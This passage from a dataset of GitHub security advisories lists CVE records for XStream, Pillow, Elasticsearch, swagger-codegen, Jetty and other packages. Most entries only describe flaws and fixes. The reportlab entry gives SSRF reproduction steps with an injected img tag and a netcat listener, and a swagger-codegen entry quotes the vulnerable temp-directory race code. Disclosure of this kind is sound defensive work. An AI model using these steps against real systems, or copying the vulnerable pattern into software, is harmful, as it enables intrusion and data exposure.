See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21346](https://x-stream.github.io/CVE-2021-21346.html).

### Credits
wh1t3p1g G5-RD6@IIE found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
480,34016,com.thoughtworks.xstream:xstream,GHSA-hwpc-8xqv-jvj4,CVE-2021-21345,https://github.com/advisories/GHSA-hwpc-8xqv-jvj4,moderate,2021-03-22 23:28:38 UTC,XStream is vulnerable to a Remote Command Execution attack,"### Impact
The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21345](https://x-stream.github.io/CVE-2021-21345.html).

### Credits
钟潦贵 (Liaogui Zhong) found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
481,34016,com.thoughtworks.xstream:xstream,GHSA-59jw-jqf4-3wq3,CVE-2021-21344,https://github.com/advisories/GHSA-59jw-jqf4-3wq3,moderate,2021-03-22 23:28:23 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21344](https://x-stream.github.io/CVE-2021-21344.html).

### Credits
钟潦贵 (Liaogui Zhong) found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
482,34016,com.thoughtworks.xstream:xstream,GHSA-74cv-f58x-f9wf,CVE-2021-21343,https://github.com/advisories/GHSA-74cv-f58x-f9wf,moderate,2021-03-22 23:28:13 UTC,XStream is vulnerable to an Arbitrary File Deletion on the local host when unmarshalling as long as the executing process has sufficient rights,"### Impact
The processed stream at unmarshalling time contains type information to recreate the formerly written objects.  XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed input stream and replace or inject objects, that result in the deletion of a file on the local host. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21343](https://x-stream.github.io/CVE-2021-21343.html).

### Credits
钟潦贵 (Liaogui Zhong) found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
483,34016,com.thoughtworks.xstream:xstream,GHSA-2p3x-qw9c-25hh,CVE-2021-21341,https://github.com/advisories/GHSA-2p3x-qw9c-25hh,high,2021-03-22 23:27:51 UTC,XStream can cause a Denial of Service.,"### Impact
The vulnerability may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21341](https://x-stream.github.io/CVE-2021-21341.html).

### Credits
The vulnerability was discovered and reported by threedr3am.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
484,34016,com.thoughtworks.xstream:xstream,GHSA-hvv8-336g-rx3m,CVE-2021-21342,https://github.com/advisories/GHSA-hvv8-336g-rx3m,moderate,2021-03-22 23:28:01 UTC,A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host,"### Impact
The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed input stream and replace or inject objects, that result in a server-side forgery request. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21342](https://x-stream.github.io/CVE-2021-21342.html).

### Credits
钟潦贵 (Liaogui Zhong) found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
485,19844,Pillow,GHSA-p43w-g3c5-g5mq,CVE-2021-25293,https://github.com/advisories/GHSA-p43w-g3c5-g5mq,high,2021-03-29 16:35:27 UTC,Out of bounds read in Pillow,An issue was discovered in Pillow before 8.1.1. There is an out-of-bounds read in SGIRleDecode.c.,pip
486,19844,Pillow,GHSA-8xjq-8fcg-g5hw,CVE-2021-25290,https://github.com/advisories/GHSA-8xjq-8fcg-g5hw,high,2021-03-29 16:35:36 UTC,Out-of-bounds Write in Pillow,"An issue was discovered in Pillow before 8.1.1. In TiffDecode.c, there is a negative-offset memcpy with an invalid size.",pip
487,19844,Pillow,GHSA-9hx2-hgq2-2g4f,CVE-2021-25292,https://github.com/advisories/GHSA-9hx2-hgq2-2g4f,moderate,2021-03-29 16:35:46 UTC,Regular Expression Denial of Service (ReDoS) in Pillow,An issue was discovered in Pillow before 8.1.1. The PDF parser allows a regular expression DoS (ReDoS) attack via a crafted PDF file because of a catastrophic backtracking regex.,pip
488,19844,Pillow,GHSA-mvg9-xffr-p774,CVE-2021-25291,https://github.com/advisories/GHSA-mvg9-xffr-p774,high,2021-03-29 16:35:57 UTC,Out of bounds read in Pillow,"An issue was discovered in Pillow before 8.1.1. In TiffDecode.c, there is an out-of-bounds read in TiffreadRGBATile via invalid tile boundaries.",pip
489,16942,url-parse,GHSA-9m6j-fcg5-2442,CVE-2021-27515,https://github.com/advisories/GHSA-9m6j-fcg5-2442,moderate,2021-05-06 16:10:51 UTC,Path traversal in url-parse,url-parse before 1.5.0 mishandles certain uses of backslash such as http:\/ and interprets the URI as a relative path.,npm
490,19858,Pygments,GHSA-pq64-v7f5-gqh8,CVE-2021-27291,https://github.com/advisories/GHSA-pq64-v7f5-gqh8,high,2021-03-29 16:33:03 UTC,Regular Expression Denial of Service (ReDoS) in Pygments,"In pygments 1.1+, fixed in 2.7.4, the lexers used to parse programming languages rely heavily on regular expressions. Some of the regular expressions have exponential or cubic worst-case complexity and are vulnerable to ReDoS. By crafting malicious input, an attacker can cause a denial of service.",pip
491,17510,ua-parser-js,GHSA-78cj-fxph-m83p,CVE-2021-27292,https://github.com/advisories/GHSA-78cj-fxph-m83p,high,2021-05-06 16:11:13 UTC,Regular Expression Denial of Service (ReDoS) in ua-parser-js,"ua-parser-js >= 0.7.14, fixed in 0.7.24, uses a regular expression which is vulnerable to denial of service. If an attacker sends a malicious User-Agent header, ua-parser-js will get stuck processing it for an extended period of time.",npm
492,18939,kramdown,GHSA-52p9-v744-mwjj,CVE-2021-28834,https://github.com/advisories/GHSA-52p9-v744-mwjj,high,2021-03-29 16:30:34 UTC,Remote code execution in Kramdown,"Kramdown before 2.3.1 does not restrict Rouge formatters to the Rouge::Formatters namespace, and thus arbitrary classes can be instantiated.",rubygems
493,19835,lxml,GHSA-jq4v-f5q6-mjqq,CVE-2021-28957,https://github.com/advisories/GHSA-jq4v-f5q6-mjqq,moderate,2021-03-22 16:53:53 UTC,lxml before 4.6.3 vulnerable to Cross-Site Scripting,"An XSS vulnerability was discovered in the python `lxml` clean module versions before 4.6.3. When disabling `the safe_attrs_only` and `forms` arguments, the `Cleaner` class does not remove the `formaction` attribute allowing for JS to bypass the sanitizer. A remote attacker could exploit this flaw to run arbitrary JS code on users who interact with incorrectly sanitized HTML. This issue is patched in `lxml` 4.6.3.",pip
494,20105,reportlab,GHSA-mpvw-25mg-59vx,CVE-2020-28463,https://github.com/advisories/GHSA-mpvw-25mg-59vx,moderate,2021-03-29 16:32:27 UTC,Server-side Request Forgery (SSRF) via img tags in reportlab,"All versions of package reportlab at time of writing are vulnerable to Server-side Request Forgery (SSRF) via img tags. In order to reduce risk, use trustedSchemes & trustedHosts (see in Reportlab's documentation) Steps to reproduce by Karan Bamal: 1. Download and install the latest package of reportlab 2. Go to demos -> odyssey -> dodyssey 3. In the text file odyssey.txt that needs to be converted to pdf inject <img src=""http://127.0.0.1:5000"" valign=""top""/> 4. Create a nc listener nc -lp 5000 5. Run python3 dodyssey.py 6. You will get a hit on your nc showing we have successfully proceded to send a server side request 7. dodyssey.py will show error since there is no img file on the url, but we are able to do SSRF",pip
495,19870,djangorestframework,GHSA-fx83-3ph3-9j2q,CVE-2020-25626,https://github.com/advisories/GHSA-fx83-3ph3-9j2q,moderate,2021-03-19 21:32:47 UTC,Cross-site Scripting (XSS) in Django REST Framework,"A flaw was found in Django REST Framework versions before 3.12.0 and before 3.11.2. When using the browseable API viewer, Django REST Framework fails to properly escape certain strings that can come from user input. This allows a user who can control those strings to inject malicious <script> tags, leading to a cross-site-scripting (XSS) vulnerability.",pip
496,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-jgwr-3qm3-26f3,CVE-2021-25329,https://github.com/advisories/GHSA-jgwr-3qm3-26f3,high,2021-03-19 20:11:13 UTC,Potential remote code execution in Apache Tomcat,"The fix for CVE-2020-9484 was incomplete. When using Apache Tomcat 10.0.0-M1 to 10.0.0, 9.0.0.M1 to 9.0.41, 8.5.0 to 8.5.61 or 7.0.0. to 7.0.107 with a configuration edge case that was highly unlikely to be used, the Tomcat instance was still vulnerable to CVE-2020-9494. Note that both the previously published prerequisites for CVE-2020-9484 and the previously published mitigations for CVE-2020-9484 also apply to this issue.",maven
497,27179,twitter-stream,GHSA-p6p8-q4pj-f74m,CVE-2020-24392,https://github.com/advisories/GHSA-p6p8-q4pj-f74m,moderate,2021-03-29 16:28:42 UTC,Improper Certificate Validation in twitter-stream,"In voloko twitter-stream 0.1.16, missing TLS hostname validation allows an attacker to perform a man-in-the-middle attack against users of the library (because eventmachine is misused).",rubygems
498,16534,merge,GHSA-7wpw-2hjm-89gp,CVE-2020-28499,https://github.com/advisories/GHSA-7wpw-2hjm-89gp,high,2021-05-04 20:18:47 UTC,Prototype Pollution in merge,All versions of package merge <2.1.1 are vulnerable to Prototype Pollution via _recursiveMerge .,npm
499,16759,xmlhttprequest,GHSA-h4j5-c7cj-74xg,CVE-2020-28502,https://github.com/advisories/GHSA-h4j5-c7cj-74xg,high,2021-05-04 18:02:34 UTC,Arbitrary Code Injection,"This affects the package xmlhttprequest before 1.7.0; all versions of package xmlhttprequest-ssl. Provided requests are sent synchronously (async=False on xhr.open), malicious user input flowing into xhr.send could result in arbitrary code being injected and run.",npm
500,34041,org.elasticsearch:elasticsearch,GHSA-hwvv-438r-mhvj,CVE-2021-22134,https://github.com/advisories/GHSA-hwvv-438r-mhvj,moderate,2021-03-18 19:23:57 UTC,Exposure of Sensitive Information to an Unauthorized Actor,A document disclosure flaw was found in Elasticsearch versions after 7.6.0 and before 7.11.0 when Document or Field Level Security is used. Get requests do not properly apply security permissions when executing a query against a recently updated document. This affects documents that have been updated and not yet refreshed in the index. This could result in the search disclosing the existence of documents and fields the attacker should not be able to view.,maven
501,34041,org.elasticsearch:elasticsearch,GHSA-g9fw-9x87-rmrj,CVE-2020-7020,https://github.com/advisories/GHSA-g9fw-9x87-rmrj,low,2021-03-18 19:27:13 UTC,Privilege Context Switching Error in Elasticsearch,Elasticsearch versions before 6.8.13 and 7.9.2 contain a document disclosure flaw when Document or Field Level Security is used. Search queries do not properly preserve security permissions when executing certain complex queries. This could result in the search disclosing the existence of documents the attacker should not be able to view. This could result in an attacker gaining additional insight into potentially sensitive indices.,maven
502,34041,org.elasticsearch:elasticsearch,GHSA-hqqv-9x3v-mp7w,CVE-2020-7014,https://github.com/advisories/GHSA-hqqv-9x3v-mp7w,moderate,2021-03-18 19:27:20 UTC,Privilege Escalation Flaw in Elasticsearch,The fix for CVE-2020-7009 was found to be incomplete. Elasticsearch versions from 6.7.0 to 6.8.7 and 7.0.0 to 7.6.1 contain a privilege escalation flaw if an attacker is able to create API keys and also authentication tokens. An attacker who is able to generate an API key and an authentication token can perform a series of steps that result in an authentication token being generated with elevated privileges.,maven
503,34041,org.elasticsearch:elasticsearch,GHSA-5fvx-2jj3-6mff,CVE-2021-22132,https://github.com/advisories/GHSA-5fvx-2jj3-6mff,moderate,2021-03-18 19:27:27 UTC,Insufficiently Protected Credentials in Elasticsearch,Elasticsearch versions 7.7.0 to 7.10.1 contain an information disclosure flaw in the async search API. Users who execute an async search will improperly store the HTTP headers. An Elasticsearch user with the ability to read the .tasks index could obtain sensitive request headers of other users in the cluster. This issue is fixed in Elasticsearch 7.10.2,maven
504,20360,channels,GHSA-v542-8q9x-cffc,CVE-2020-35681,https://github.com/advisories/GHSA-v542-8q9x-cffc,high,2021-03-19 21:29:02 UTC,Exposure of Sensitive Information to an Unauthorized Actor,"Django Channels 3.x before 3.0.3 allows remote attackers to obtain sensitive information from a different request scope. The legacy channels.http.AsgiHandler class, used for handling HTTP type requests in an ASGI environment prior to Django 3.0, did not correctly separate request scopes in Channels 3.0. In many cases this would result in a crash but, with correct timing, responses could be sent to the wrong client, resulting in potential leakage of session identifiers and other sensitive data. Note that this affects only the legacy Channels provided class, and not Django's similar ASGIHandler, available from Django 3.0.",pip
505,19844,Pillow,GHSA-95q3-8gr9-gm8w,CVE-2021-27923,https://github.com/advisories/GHSA-95q3-8gr9-gm8w,high,2021-03-18 19:54:43 UTC,Denial of Service by Uncontrolled Resource Consumption,"Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for an ICO container, and thus an attempted memory allocation can be very large.",pip
506,19844,Pillow,GHSA-f4w8-cv6p-x6r5,CVE-2021-27921,https://github.com/advisories/GHSA-f4w8-cv6p-x6r5,high,2021-03-18 19:55:13 UTC,Denial of Service by Uncontrolled Resource Consumption,"Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large.",pip
507,19844,Pillow,GHSA-f5g8-5qq7-938w,CVE-2020-35653,https://github.com/advisories/GHSA-f5g8-5qq7-938w,high,2021-03-18 19:55:41 UTC,Out-of-bounds Read,"In Pillow before 8.1.0, PcxDecode has a buffer over-read when decoding a crafted PCX file because the user-supplied stride value is trusted for buffer calculations.",pip
508,19844,Pillow,GHSA-vqcj-wrf2-7v73,CVE-2020-35654,https://github.com/advisories/GHSA-vqcj-wrf2-7v73,high,2021-03-18 19:55:27 UTC,Out-of-bounds Write,"In Pillow before 8.1.0, TiffDecode has a heap-based buffer overflow when decoding crafted YCbCr files because of certain interpretation conflicts with LibTIFF in RGBA mode.",pip
509,19844,Pillow,GHSA-hf64-x4gq-p99h,CVE-2020-35655,https://github.com/advisories/GHSA-hf64-x4gq-p99h,high,2021-03-18 19:55:34 UTC,Out-of-bounds Read,"In Pillow before 8.1.0, SGIRleDecode has a 4-byte buffer over-read when decoding crafted SGI RLE image files because offsets and length tables are mishandled.",pip
510,19844,Pillow,GHSA-3wvg-mj6g-m9cv,CVE-2021-27922,https://github.com/advisories/GHSA-3wvg-mj6g-m9cv,high,2021-03-18 19:55:21 UTC,Uncontrolled Resource Consumption,"Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for an ICNS container, and thus an attempted memory allocation can be very large.",pip
511,18251,madge,GHSA-753c-phhg-cj29,CVE-2021-23352,https://github.com/advisories/GHSA-753c-phhg-cj29,high,2021-03-12 23:01:49 UTC,Improper Neutralization of Special Elements used in a Command,"This affects the package madge before 4.0.1. It is possible to specify a custom Graphviz path via the graphVizPath option parameter which when the .image(), .svg() or .dot() functions are called, is executed by the childprocess.exec function.",npm
512,34657,org.apache.velocity:velocity-tools,GHSA-fh63-4r66-jc7v,CVE-2020-13959,https://github.com/advisories/GHSA-fh63-4r66-jc7v,moderate,2021-03-12 20:24:22 UTC,Cross-site scripting (XSS) in Apache Velocity Tools,"The default error page for VelocityView in Apache Velocity Tools prior to 3.1 reflects back the vm file that was entered as part of the URL. An attacker can set an XSS payload file as this vm file in the URL which results in this payload being executed. XSS vulnerabilities allow attackers to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.",maven
513,35825,org.keycloak:keycloak-core,GHSA-xf46-8vvp-4hxx,CVE-2021-20262,https://github.com/advisories/GHSA-xf46-8vvp-4hxx,moderate,2021-03-12 21:33:42 UTC,Missing authentication for critical function,"A flaw was found in Keycloak 12.0.0 where re-authentication does not occur while updating the password. This flaw allows an attacker to take over an account if they can obtain temporary, physical access to a user’s browser. The highest threat from this vulnerability is to confidentiality, integrity, as well as system availability.",maven
514,16502,xmldom,GHSA-h6q6-9hqw-rwfv,CVE-2021-21366,https://github.com/advisories/GHSA-h6q6-9hqw-rwfv,low,2021-03-12 22:39:39 UTC,Misinterpretation of malicious XML input,"### Impact

xmldom versions 0.4.0 and older do not correctly preserve [system identifiers](https://www.w3.org/TR/2008/REC-xml-20081126/#d0e4313), [FPIs](https://en.wikipedia.org/wiki/Formal_Public_Identifier) or [namespaces](https://www.w3.org/TR/xml-names11/) when repeatedly parsing and serializing maliciously crafted documents.

This may lead to unexpected syntactic changes during XML processing in some downstream applications.

### Patches

Update to 0.5.0 (once it is released)

### Workarounds

Downstream applications can validate the input and reject the maliciously crafted documents.

### References

Similar to this one reported on the Go standard library:

- https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [`xmldom/xmldom`](https://github.com/xmldom/xmldom)
* Email us: send an email to **all** addresses that are shown by `npm owner ls xmldom`",npm
515,16112,react-dev-utils,GHSA-5q6m-3h65-w53x,CVE-2021-24033,https://github.com/advisories/GHSA-5q6m-3h65-w53x,moderate,2021-03-11 22:26:09 UTC,react-dev-utils OS Command Injection in function `getProcessForPort`,"react-dev-utils prior to v11.0.4 exposes a function, `getProcessForPort`, where an input argument is concatenated into a command string to be executed. This function is typically used from react-scripts (in Create React App projects), where the usage is safe. Only when this function is manually invoked with user-provided values (ie: by custom code) is there the potential for command injection. If you're consuming it from react-scripts then this issue does not affect you.",npm
516,39194,io.swagger:swagger-codegen,GHSA-hpv8-9rq5-hq7w,CVE-2021-21364,https://github.com/advisories/GHSA-hpv8-9rq5-hq7w,low,2021-03-11 03:09:18 UTC,Generated Code Contains Local Information Disclosure Vulnerability,"### Impact

**This vulnerability impacts generated code.** If this code was generated as a one-off occasion, not as a part of an automated CI/CD process, this code will remain vulnerable until fixed manually!

On Unix-Like systems, the system temporary directory is shared between all local users. When files/directories are created, the default `umask` settings for the process are respected. As a result, by default, most processes/apis will create files/directories with the permissions `-rw-r--r--` and `drwxr-xr-x` respectively, unless an API that explicitly sets safe file permissions is used.

#### Java Code

The method `File.createTempFile` from the JDK is vulnerable to this local information disclosure vulnerability.

- https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-codegen/src/main/resources/kotlin-client/infrastructure/ApiClient.kt.mustache#L209
- https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-codegen/src/main/resources/finch/api.mustache#L84
- https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-codegen/src/main/resources/Java/libraries/okhttp-gson/ApiClient.mustache#L831-L834
- https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-codegen/src/main/resources/Java/libraries/jersey2/ApiClient.mustache#L630-L633

### Patches

Fix has been applied to the master branch with:

* https://github.com/swagger-api/swagger-codegen/commit/35adbd552d5f99b3ff1e0e59da228becc85190f2

included in release: 2.4.19


### Workarounds

Users can remediate the vulnerability in non patched version by manually (or programmatically e.g. in CI) updating the generated source code to use `java.nio.files.Files` temporary file creation instead of `java.io.File`, e.g. by changing

```java

    if (tempFolderPath == null)
      return File.createTempFile(prefix, suffix);
    else
      return File.createTempFile(prefix, suffix, new File(tempFolderPath));

```

to 

```java

    if (tempFolderPath == null)
      return Files.createTempFile(prefix, suffix).toFile();
    else
      return Files.createTempFile(Paths.get(tempFolderPath), prefix, suffix).toFile();

```

or generally changing:

```java

File.createTempFile(prefix, suffix);

```

to 

```java

Files.createTempFile(prefix, suffix).toFile();

```

### References

* [CWE-378: Creation of Temporary File With Insecure Permissions](https://cwe.mitre.org/data/definitions/378.html)
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
* [CWE-732: Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html)

### For more information
If you have any questions or comments about this advisory:

* Email us at [security@swagger.io](mailto:security@swagger.io)

#### Original vulnerability report

> I'm performing OSS security research under the GitHub Security Lab Bug Bounty program.
> I've been using a custom CodeQL query to find local temporary directory vulnerabilities in OSS with three custom CodeQL queries.
> 
> - https://github.com/github/codeql/pull/4388/files#diff-71d36c0f2bd0b08e32866f873f1c906cdc17277e0ad327c0c6cd2c882f30de4f
> - https://github.com/github/codeql/pull/4388/files#diff-1893a18a8bf43c011d61a7889d0139b998a5a78701a30fe7722eddd4c506aaac
> - https://github.com/github/codeql/pull/4473
> 
> The code generated by the Swagger Generator contains a local information disclosure vulnerability. The system temporary directory, on unix-like systems is shared between multiple users. Information written to this directory, or directories created under this directory that do not correctly set the posix standard permissions can have these directories read/modified by other users.
> 
> ---
> 
> This code exists in the code generator, in the generated code.
> 
> In this case, I believe this is only a local information disclosure. IE. another user can read the information, not replace it.
> 
> In particular, the method `File.createTempFile` from the JDK is vulnerable to this local information disclosure vulnerability.
> 
> This is because `File.createTempFile` creates a file inside of the system temporary directory with the permissions: `-rw-r--r--`. Thus the contents of this file are viewable by all other users locally on the system.
> 
> - https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-codegen/src/main/resources/kotlin-client/infrastructure/ApiClient.kt.mustache#L209
> - https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-codegen/src/main/resources/finch/api.mustache#L84
> - https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-codegen/src/main/resources/Java/libraries/okhttp-gson/ApiClient.mustache#L831-L834
> - https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-codegen/src/main/resources/Java/libraries/jersey2/ApiClient.mustache#L630-L633
> 
> The fix here is to switch to the `Files` API, instead of `File` as that appropriately sets the file permissions.
> ",maven
517,39194,io.swagger:swagger-codegen,GHSA-pc22-3g76-gm6j,CVE-2021-21363,https://github.com/advisories/GHSA-pc22-3g76-gm6j,low,2021-03-11 03:09:16 UTC,Generator Web Application: Local Privilege Escalation Vulnerability via System Temp Directory,"### Impact

On Unix like systems, the system's temporary directory is shared between all users on that system. A collocated user can observe the process of creating a temporary sub directory in the shared temporary directory and race to complete the creation of the temporary subdirectory. 

This vulnerability is local privilege escalation because the contents of the `outputFolder` can be appended to by an attacker. As such, code written to this directory, when executed can be attacker controlled.

#### Java Code

The method `File.createTempFile` from the JDK is vulnerable to this local information disclosure vulnerability.

https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-generator/src/main/java/io/swagger/generator/online/Generator.java#L174-L185


### Patches

Fix has been applied to the master branch with:

* https://github.com/swagger-api/swagger-codegen/commit/987ea7a30b463cc239580d6ad166c707ae942a89

included in release: 2.4.19


### References

* [CWE-378: Creation of Temporary File With Insecure Permissions](https://cwe.mitre.org/data/definitions/378.html)
* [CWE-379: Creation of Temporary File in Directory with Insecure Permissions](https://cwe.mitre.org/data/definitions/379.html)

### For more information
If you have any questions or comments about this advisory:

* Email us at [security@swagger.io](mailto:security@swagger.io)

#### Original vulnerability report

> I'm performing OSS security research under the GitHub Security Lab Bug Bounty program.
> I've been using a custom CodeQL query to find local temporary directory vulnerabilities in OSS with three custom CodeQL queries.
> 
> - https://github.com/github/codeql/pull/4388/files#diff-71d36c0f2bd0b08e32866f873f1c906cdc17277e0ad327c0c6cd2c882f30de4f
> - https://github.com/github/codeql/pull/4388/files#diff-1893a18a8bf43c011d61a7889d0139b998a5a78701a30fe7722eddd4c506aaac
> - https://github.com/github/codeql/pull/4473
> 
> The code generated by the Swagger Generator contains a local information disclosure vulnerability. The system temporary directory, on unix-like systems is shared between multiple users. Information written to this directory, or directories created under this directory that do not correctly set the posix standard permissions can have these directories read/modified by other users.
> 
> ---
> 
> This vulnerability exists in the maven plugin.
> 
> This vulnerability is distinctly different. This vulnerability is most likely a local privilege escalation vulnerability.
> 
> https://github.com/swagger-api/swagger-codegen/blob/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab/modules/swagger-generator/src/main/java/io/swagger/generator/online/Generator.java#L174-L185
> 
> This vulnerability is very similar to this similar vulnerability I disclosed in the Eclipse Jetty project.
> 
> https://github.com/eclipse/jetty.project/security/advisories/GHSA-g3wg-6mcf-8jj6
> 
> This is due to a race condition between the call to `delete` and the call to `mkdirs`.
> 
> ```java
> // ensure file will always be unique by appending random digits
> File outputFolder = File.createTempFile(""codegen-"", ""-tmp""); // Attacker knows the full path of the file that will be generated
> // delete the file that was created
> outputFolder.delete(); // Attacker sees file is deleted and begins a race to create their own directory before Swagger Code Generator.
> // and make a directory of the same name
> // SECURITY VULNERABILITY: Race Condition! - Attacker beats Swagger Code Generator and now owns this directory
> outputFolder.mkdirs();
> ```
> 
> This vulnerability is local privilege escalation because the contents of the `outputFolder` can be appended to by an attacker. As such, code written to this directory, when executed can be attacker controlled.
> 
> The fix here is to switch to the `Files` API for creating temporary directories. Which does not contain this race condition, and appropriately sets the correct file permissions.
> ",maven
518,27647,activerecord-session_store,GHSA-cvw2-xj8r-mjf7,CVE-2019-25025,https://github.com/advisories/GHSA-cvw2-xj8r-mjf7,moderate,2021-03-09 00:45:31 UTC,Activerecord-session_store Timing Attack,"The `activerecord-session_store` (aka Active Record Session Store) component through 1.1.3 for Ruby on Rails does not use a constant-time approach when delivering information about whether a guessed session ID is valid. Consequently, remote attackers can leverage timing discrepancies to achieve a correct guess in a relatively short amount of time. This is a related issue to CVE-2019-16782. 

## Recommendation

This has been fixed in version 2.0.0.  All users are advised to update to this version or later.",rubygems
519,33935,org.eclipse.jetty:jetty-server,GHSA-m394-8rww-3jr7,CVE-2020-27223,https://github.com/advisories/GHSA-m394-8rww-3jr7,moderate,2021-03-10 03:46:47 UTC,DOS vulnerability for Quoted Quality CSV headers,"### Impact
When Jetty handles a request containing request headers with a large number of “quality” (i.e. q) parameters (such as what are seen on the `Accept`, `Accept-Encoding`, and `Accept-Language` request headers), the server may enter a denial of service (DoS) state due to high CPU usage while sorting the list of values based on their quality values.  A single request can easily consume minutes of CPU time before it is even dispatched to the application.

The only features within Jetty that can trigger this behavior are:

- Default Error Handling - the `Accept` request header with the `QuotedQualityCSV` is used to determine what kind of content to send back to the client (html, text, json, xml, etc)
- `StatisticsServlet` - uses the `Accept` request header with the `QuotedQualityCSV` to determine what kind of content to send back to the client (xml, json, text, html, etc)
- `HttpServletRequest.getLocale()` - uses the `Accept-Language` request header with the `QuotedQualityCSV` to determine which “preferred” language is returned on this call.
- `HttpservletRequest.getLocales()` - is similar to the above, but returns an ordered list of locales based on the quality values on the `Accept-Language` request header.
- `DefaultServlet` - uses the `Accept-Encoding` request header with the `QuotedQualityCSV` to determine which kind of pre-compressed content should be sent back for static content (content that is not matched against a url-pattern in your web app)

### Versions
`QuotedQualityCSV` was introduced to Jetty 9.3.9.v20160517 and the bug that introduced the vulnerability was in 9.4.6.v20170531. 

Currently, known vulnerable versions include:

- 9.4.6.v20170531 thru to 9.4.36.v20210114
- 10.0.0
- 11.0.0

### Workarounds

